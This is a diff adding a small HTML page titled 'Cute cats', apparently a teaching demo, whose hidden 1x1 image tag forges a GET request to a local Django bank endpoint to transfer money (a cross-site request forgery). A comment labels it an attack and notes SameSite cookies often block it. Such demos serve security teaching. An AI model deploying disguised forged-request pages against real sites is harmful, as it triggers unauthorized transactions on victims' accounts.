@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head><title>Cute cats</title></head>
+<body>
+    <!-- Attack 2: the browser "loads the image" = sends the GET request, no click needed.
+         (Modern browsers send no session cookie with this cross-site request because
+         Django sets SameSite=Lax, so this one often fails today. The link still works.) -->
+    <img src="http://127.0.0.1:8000/bank/unsafe-transfer/?amount=500" width="1" height="1">
+    <p>Nothing to see here.</p>
+</body>
+</html>
